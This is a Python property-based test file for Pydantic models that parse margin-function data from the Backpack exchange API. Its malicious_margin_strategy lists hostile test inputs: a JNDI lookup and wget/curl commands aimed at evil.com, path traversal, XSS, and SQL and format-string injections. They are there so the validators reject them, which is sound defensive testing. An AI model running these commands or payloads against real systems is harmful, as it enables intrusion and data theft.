"""Property-based tests for Backpack raw margin function models.

These tests validate critical security boundary models that process external margin function data.
The models tested here are essential for margin calculation, risk management, and position sizing.

SECURITY CRITICAL: These raw models protect against:
- Malicious margin function data that could manipulate risk calculations
- Financial precision errors in margin calculations
- Buffer overflow attacks through oversized margin values
- Injection attacks through malformed margin structures
- Type manipulation that could affect margin function behavior
- Base/factor manipulation that could affect position sizing

Property testing ensures comprehensive coverage of margin function edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_margin_functions import (
    BackpackRawImfFunction,
    BackpackRawMmfFunction,
    BackpackRawPositionImfFunction,
    BackpackRawPositionMmfFunction,
    BackpackRawMarginCoverage,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR MARGIN FUNCTION MODEL TESTING
# =============================================================================


def margin_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for margin function base and factor fields."""
    return st.one_of([
        # Margin function values (typically small positive values)
        st.decimals(min_value=Decimal("0"), max_value=Decimal("1"), places=8).map(str),
        st.decimals(min_value=Decimal("0.001"), max_value=Decimal("0.1"), places=6).map(str),
        # Common margin values
        st.just("0.01"),  # 1% base
        st.just("0.05"),  # 5% base
        st.just("0.005"),  # 0.5% factor
        st.just("0.008"),  # 0.8% factor
        st.just("0.02"),  # 2% MMF base
        st.just("0.1"),  # 10% margin
        st.just("0.00001"),  # Very small margin
        st.just("0.25"),  # 25% margin
        st.just("0.5"),  # 50% margin
        # Edge cases
        st.just("0"),  # Zero margin
        st.just("0.0"),  # Zero with decimal
        st.just("1.0"),  # 100% margin
        # Scientific notation (valid for decimal parsing)
        st.just("1e-3"),
        st.just("5e-2"),
        st.just("1.5e-4"),
    ])


def margin_type_strategy() -> SearchStrategy[str]:
    """Generate valid margin function type strings."""
    return st.one_of([
        # Common types
        st.just("sqrt"),  # Square root function
        st.just("linear"),  # Linear function
        st.just("logarithmic"),  # Logarithmic function
        st.just("exponential"),  # Exponential function
        # Generated types
        st.text(
            min_size=2,
            max_size=20,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: x and not x.startswith("_") and not x.endswith("_")),
        # Edge cases
        st.just("a"),  # Single character
        st.just("VERYLONGTYPENAME"),  # Longer type
    ])


def margin_coverage_strategy() -> SearchStrategy[str]:
    """Generate valid margin coverage status strings."""
    return st.sampled_from([
        "good",
        "bad",
        "warning",
        "critical",
        "sufficient",
        "insufficient",
        "adequate",
        "inadequate",
    ])


@st.composite
def valid_imf_function_data(draw) -> dict[str, Any]:
    """Generate valid IMF function data."""
    return {
        "base": draw(margin_decimal_strategy()),
        "factor": draw(margin_decimal_strategy()),
    }


@st.composite
def valid_mmf_function_data(draw) -> dict[str, Any]:
    """Generate valid MMF function data."""
    return {
        "base": draw(margin_decimal_strategy()),
        "factor": draw(margin_decimal_strategy()),
    }


@st.composite
def valid_position_imf_function_data(draw) -> dict[str, Any]:
    """Generate valid position IMF function data."""
    return {
        "type": draw(margin_type_strategy()),
        "base": draw(margin_decimal_strategy()),
        "factor": draw(margin_decimal_strategy()),
    }


@st.composite
def valid_position_mmf_function_data(draw) -> dict[str, Any]:
    """Generate valid position MMF function data."""
    return {
        "type": draw(margin_type_strategy()),
        "base": draw(margin_decimal_strategy()),
        "factor": draw(margin_decimal_strategy()),
    }


@st.composite
def valid_margin_coverage_data(draw) -> dict[str, Any]:
    """Generate valid margin coverage data."""
    return {
        "type": "marginCoverage",
        "marginCoverage": draw(margin_coverage_strategy()),
    }


def malicious_margin_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for margin security testing."""
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-margins}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('margin-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE margins;--"),
        st.just("1' UNION SELECT * FROM positions--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("M" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.margins.find(); //"),
        # JSON injection
        st.just('{"$where": "this.base > 1"}'),
        # Margin manipulation
        st.just("0.01'; UPDATE margins SET base=1;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW IMF FUNCTION MODEL
# =============================================================================


class TestBackpackRawImfFunctionProperties:
    """Property-based tests for BackpackRawImfFunction validation and security."""

    @given(imf_data=valid_imf_function_data())
    def test_imf_function_validation_success_properties(self, imf_data: dict[str, Any]) -> None:
        """Property: Valid IMF function data should always create valid BackpackRawImfFunction objects."""
        # Skip invalid decimal values
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(imf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        for field in ["base", "factor"]:
            value = imf_data[field]
            assume(isinstance(value, str) and value.strip())

        obj = BackpackRawImfFunction.model_validate(imf_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawImfFunction)

        # Property: All fields should be preserved with correct types
        assert obj.base == imf_data["base"]
        assert obj.factor == imf_data["factor"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "ignore"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["base", "factor"]), malicious_value=malicious_margin_strategy()
    )
    def test_imf_function_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: IMF function model should reject malicious inputs safely."""
        base_data = {
            "base": "0.01",
            "factor": "0.005",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawImfFunction.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from(["base", "factor"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("0.01"),
            st.just("1e-3"),
            st.just("5e-2"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_imf_function_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: IMF function decimal fields should validate properly."""
        imf_data = {
            "base": "0.01",
            "factor": "0.005",
        }
        imf_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawImfFunction.model_validate(imf_data)
                field_value = getattr(obj, decimal_field)
                assert field_value == decimal_value
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    BackpackRawImfFunction.model_validate(imf_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawImfFunction.model_validate(imf_data)

    @given(imf_data=valid_imf_function_data())
    def test_imf_function_immutability_properties(self, imf_data: dict[str, Any]) -> None:
        """Property: IMF function objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(imf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
                assume(isinstance(imf_data[field], str) and imf_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawImfFunction.model_validate(imf_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.base = "0.99"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.factor = "0.99"

    @given(imf_data=valid_imf_function_data())
    def test_imf_function_extra_fields_properties(self, imf_data: dict[str, Any]) -> None:
        """Property: IMF function model should ignore extra fields."""
        # Skip invalid data
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(imf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
                assume(isinstance(imf_data[field], str) and imf_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        # Add extra fields
        imf_data_with_extra = imf_data.copy()
        imf_data_with_extra["extra"] = "ignored"
        imf_data_with_extra["type"] = "sqrt"

        obj = BackpackRawImfFunction.model_validate(imf_data_with_extra)

        # Property: Extra fields should be ignored
        assert obj.base == imf_data["base"]
        assert obj.factor == imf_data["factor"]
        assert not hasattr(obj, "extra")
        assert not hasattr(obj, "type")


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW MMF FUNCTION MODEL
# =============================================================================


class TestBackpackRawMmfFunctionProperties:
    """Property-based tests for BackpackRawMmfFunction validation and security."""

    @given(mmf_data=valid_mmf_function_data())
    def test_mmf_function_validation_success_properties(self, mmf_data: dict[str, Any]) -> None:
        """Property: Valid MMF function data should always create valid BackpackRawMmfFunction objects."""
        # Skip invalid decimal values
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(mmf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        for field in ["base", "factor"]:
            value = mmf_data[field]
            assume(isinstance(value, str) and value.strip())

        obj = BackpackRawMmfFunction.model_validate(mmf_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawMmfFunction)

        # Property: All fields should be preserved with correct types
        assert obj.base == mmf_data["base"]
        assert obj.factor == mmf_data["factor"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "ignore"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["base", "factor"]), malicious_value=malicious_margin_strategy()
    )
    def test_mmf_function_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: MMF function model should reject malicious inputs safely."""
        base_data = {
            "base": "0.02",
            "factor": "0.008",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawMmfFunction.model_validate(base_data)

    @given(mmf_data=valid_mmf_function_data())
    def test_mmf_function_immutability_properties(self, mmf_data: dict[str, Any]) -> None:
        """Property: MMF function objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(mmf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
                assume(isinstance(mmf_data[field], str) and mmf_data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawMmfFunction.model_validate(mmf_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.base = "0.99"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.factor = "0.99"


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW POSITION IMF FUNCTION MODEL
# =============================================================================


class TestBackpackRawPositionImfFunctionProperties:
    """Property-based tests for BackpackRawPositionImfFunction validation and security."""

    @given(position_imf_data=valid_position_imf_function_data())
    def test_position_imf_function_validation_success_properties(
        self, position_imf_data: dict[str, Any]
    ) -> None:
        """Property: Valid position IMF function data should always create valid BackpackRawPositionImfFunction objects."""
        # Skip invalid decimal values
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(position_imf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        for field in ["type", "base", "factor"]:
            value = position_imf_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawPositionImfFunction.model_validate(position_imf_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPositionImfFunction)

        # Property: All fields should be preserved with correct types
        assert obj.type == position_imf_data["type"]
        assert obj.base == position_imf_data["base"]
        assert obj.factor == position_imf_data["factor"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "ignore"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["type", "base", "factor"]),
        malicious_value=malicious_margin_strategy(),
    )
    def test_position_imf_function_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Position IMF function model should reject malicious inputs safely."""
        base_data = {
            "type": "sqrt",
            "base": "0.01",
            "factor": "0.005",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawPositionImfFunction.model_validate(base_data)

    @given(position_imf_data=valid_position_imf_function_data())
    def test_position_imf_function_immutability_properties(
        self, position_imf_data: dict[str, Any]
    ) -> None:
        """Property: Position IMF function objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(position_imf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["type", "base", "factor"]:
                assume(
                    isinstance(position_imf_data[field], str) and position_imf_data[field].strip()
                )
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawPositionImfFunction.model_validate(position_imf_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.type = "linear"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.base = "0.99"


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW POSITION MMF FUNCTION MODEL
# =============================================================================


class TestBackpackRawPositionMmfFunctionProperties:
    """Property-based tests for BackpackRawPositionMmfFunction validation and security."""

    @given(position_mmf_data=valid_position_mmf_function_data())
    def test_position_mmf_function_validation_success_properties(
        self, position_mmf_data: dict[str, Any]
    ) -> None:
        """Property: Valid position MMF function data should always create valid BackpackRawPositionMmfFunction objects."""
        # Skip invalid decimal values
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(position_mmf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        for field in ["type", "base", "factor"]:
            value = position_mmf_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawPositionMmfFunction.model_validate(position_mmf_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPositionMmfFunction)

        # Property: All fields should be preserved with correct types
        assert obj.type == position_mmf_data["type"]
        assert obj.base == position_mmf_data["base"]
        assert obj.factor == position_mmf_data["factor"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "ignore"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["type", "base", "factor"]),
        malicious_value=malicious_margin_strategy(),
    )
    def test_position_mmf_function_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Position MMF function model should reject malicious inputs safely."""
        base_data = {
            "type": "sqrt",
            "base": "0.02",
            "factor": "0.008",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawPositionMmfFunction.model_validate(base_data)

    @given(position_mmf_data=valid_position_mmf_function_data())
    def test_position_mmf_function_immutability_properties(
        self, position_mmf_data: dict[str, Any]
    ) -> None:
        """Property: Position MMF function objects should be immutable after creation."""
        # Skip invalid data
        try:
            for field in ["base", "factor"]:
                decimal_val = Decimal(position_mmf_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
            for field in ["type", "base", "factor"]:
                assume(
                    isinstance(position_mmf_data[field], str) and position_mmf_data[field].strip()
                )
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawPositionMmfFunction.model_validate(position_mmf_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.type = "linear"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.factor = "0.99"


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW MARGIN COVERAGE MODEL
# =============================================================================


class TestBackpackRawMarginCoverageProperties:
    """Property-based tests for BackpackRawMarginCoverage validation and security."""

    @given(coverage_data=valid_margin_coverage_data())
    def test_margin_coverage_validation_success_properties(
        self, coverage_data: dict[str, Any]
    ) -> None:
        """Property: Valid margin coverage data should always create valid BackpackRawMarginCoverage objects."""
        # Skip empty strings
        for field in ["type", "marginCoverage"]:
            value = coverage_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 64)

        obj = BackpackRawMarginCoverage.model_validate(coverage_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawMarginCoverage)

        # Property: All fields should be preserved with correct types
        assert obj.type == coverage_data["type"]
        assert obj.margin_coverage == coverage_data["marginCoverage"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["type", "marginCoverage"]),
        malicious_value=malicious_margin_strategy(),
    )
    def test_margin_coverage_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Margin coverage model should reject malicious inputs safely."""
        base_data = {
            "type": "marginCoverage",
            "marginCoverage": "good",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawMarginCoverage.model_validate(base_data)

    @given(coverage_data=valid_margin_coverage_data())
    def test_margin_coverage_immutability_properties(self, coverage_data: dict[str, Any]) -> None:
        """Property: Margin coverage objects should be immutable after creation."""
        # Skip empty strings
        for field in ["type", "marginCoverage"]:
            value = coverage_data[field]
            assume(isinstance(value, str) and value.strip())

        obj = BackpackRawMarginCoverage.model_validate(coverage_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.type = "newType"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.margin_coverage = "bad"


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestBackpackRawMarginIntegrationProperties:
    """Integration property tests for margin models working together."""

    @given(
        imf_data=valid_imf_function_data(),
        mmf_data=valid_mmf_function_data(),
        position_imf_data=valid_position_imf_function_data(),
        position_mmf_data=valid_position_mmf_function_data(),
        coverage_data=valid_margin_coverage_data(),
    )
    def test_margin_models_integration_properties(
        self,
        imf_data: dict[str, Any],
        mmf_data: dict[str, Any],
        position_imf_data: dict[str, Any],
        position_mmf_data: dict[str, Any],
        coverage_data: dict[str, Any],
    ) -> None:
        """Property: All margin models should work consistently together."""
        # Skip invalid data
        try:
            # Validate all decimal fields
            for data, fields in [
                (imf_data, ["base", "factor"]),
                (mmf_data, ["base", "factor"]),
                (position_imf_data, ["base", "factor"]),
                (position_mmf_data, ["base", "factor"]),
            ]:
                for field in fields:
                    decimal_val = Decimal(data[field])
                    assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate string constraints
            for data, fields in [
                (position_imf_data, ["type", "base", "factor"]),
                (position_mmf_data, ["type", "base", "factor"]),
                (coverage_data, ["type", "marginCoverage"]),
            ]:
                for field in fields:
                    assume(isinstance(data[field], str) and data[field].strip())
        except (ValueError, TypeError):
            assume(False)

        # Property: All models should be created successfully
        imf_obj = BackpackRawImfFunction.model_validate(imf_data)
        mmf_obj = BackpackRawMmfFunction.model_validate(mmf_data)
        position_imf_obj = BackpackRawPositionImfFunction.model_validate(position_imf_data)
        position_mmf_obj = BackpackRawPositionMmfFunction.model_validate(position_mmf_data)
        coverage_obj = BackpackRawMarginCoverage.model_validate(coverage_data)

        # Property: All objects should be properly typed
        assert isinstance(imf_obj, BackpackRawImfFunction)
        assert isinstance(mmf_obj, BackpackRawMmfFunction)
        assert isinstance(position_imf_obj, BackpackRawPositionImfFunction)
        assert isinstance(position_mmf_obj, BackpackRawPositionMmfFunction)
        assert isinstance(coverage_obj, BackpackRawMarginCoverage)

        # Property: Coverage type should be consistent
        assert coverage_obj.type == "marginCoverage"

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["type", "base", "factor", "marginCoverage"]),
            malicious_margin_strategy(),
            min_size=2,
            max_size=4,
        )
    )
    def test_margin_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All margin models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by all models

        # Test BackpackRawImfFunction
        if all(key in complete_malicious_data for key in ["base", "factor"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawImfFunction.model_validate({
                    "base": complete_malicious_data["base"],
                    "factor": complete_malicious_data["factor"],
                })

        # Test BackpackRawMmfFunction
        if all(key in complete_malicious_data for key in ["base", "factor"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawMmfFunction.model_validate({
                    "base": complete_malicious_data["base"],
                    "factor": complete_malicious_data["factor"],
                })

        # Test BackpackRawPositionImfFunction
        if all(key in complete_malicious_data for key in ["type", "base", "factor"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawPositionImfFunction.model_validate({
                    "type": complete_malicious_data["type"],
                    "base": complete_malicious_data["base"],
                    "factor": complete_malicious_data["factor"],
                })

        # Test BackpackRawMarginCoverage
        if all(key in complete_malicious_data for key in ["type", "marginCoverage"]):
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawMarginCoverage.model_validate({
                    "type": complete_malicious_data["type"],
                    "marginCoverage": complete_malicious_data["marginCoverage"],
                })


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawImfFunction_real_world_example() -> None:
    """Test with real-world IMF function data."""
    payload = {
        "base": "0.01",
        "factor": "0.005",
    }
    obj = BackpackRawImfFunction.model_validate(payload)
    assert obj.base == "0.01"
    assert obj.factor == "0.005"


def test_BackpackRawMmfFunction_real_world_example() -> None:
    """Test with real-world MMF function data."""
    payload = {
        "base": "0.02",
        "factor": "0.008",
    }
    obj = BackpackRawMmfFunction.model_validate(payload)
    assert obj.base == "0.02"
    assert obj.factor == "0.008"


def test_BackpackRawPositionImfFunction_real_world_example() -> None:
    """Test with real-world position IMF function data."""
    payload = {
        "type": "sqrt",
        "base": "0.01",
        "factor": "0.005",
    }
    obj = BackpackRawPositionImfFunction.model_validate(payload)
    assert obj.type == "sqrt"
    assert obj.base == "0.01"
    assert obj.factor == "0.005"


def test_BackpackRawPositionMmfFunction_real_world_example() -> None:
    """Test with real-world position MMF function data."""
    payload = {
        "type": "sqrt",
        "base": "0.02",
        "factor": "0.008",
    }
    obj = BackpackRawPositionMmfFunction.model_validate(payload)
    assert obj.type == "sqrt"
    assert obj.base == "0.02"
    assert obj.factor == "0.008"


def test_BackpackRawMarginCoverage_real_world_example() -> None:
    """Test with real-world margin coverage data."""
    payload = {
        "type": "marginCoverage",
        "marginCoverage": "good",
    }
    obj = BackpackRawMarginCoverage.model_validate(payload)
    assert obj.type == "marginCoverage"
    assert obj.margin_coverage == "good"


def test_BackpackRawImfFunction_edge_case_example() -> None:
    """Test with edge case IMF function data."""
    payload = {
        "base": "0",
        "factor": "1.0",
    }
    obj = BackpackRawImfFunction.model_validate(payload)
    assert obj.base == "0"
    assert obj.factor == "1.0"


def test_BackpackRawImfFunction_extra_fields_example() -> None:
    """Test with extra fields that should be ignored."""
    payload = {
        "base": "0.1",
        "factor": "0.2",
        "extra": "ignored",
        "type": "sqrt",
    }
    obj = BackpackRawImfFunction.model_validate(payload)
    assert obj.base == "0.1"
    assert obj.factor == "0.2"
    assert not hasattr(obj, "extra")
    assert not hasattr(obj, "type")


def test_BackpackRawPositionImfFunction_linear_type_example() -> None:
    """Test with linear type position IMF function."""
    payload = {
        "type": "linear",
        "base": "0.05",
        "factor": "0.01",
    }
    obj = BackpackRawPositionImfFunction.model_validate(payload)
    assert obj.type == "linear"
    assert obj.base == "0.05"
    assert obj.factor == "0.01"


def test_BackpackRawMarginCoverage_bad_status_example() -> None:
    """Test with bad margin coverage status."""
    payload = {
        "type": "marginCoverage",
        "marginCoverage": "insufficient",
    }
    obj = BackpackRawMarginCoverage.model_validate(payload)
    assert obj.type == "marginCoverage"
    assert obj.margin_coverage == "insufficient"


def test_BackpackRawMmfFunction_scientific_notation_example() -> None:
    """Test with scientific notation in MMF function."""
    payload = {
        "base": "1e-2",
        "factor": "5e-3",
    }
    obj = BackpackRawMmfFunction.model_validate(payload)
    assert obj.base == "1e-2"
    assert obj.factor == "5e-3"
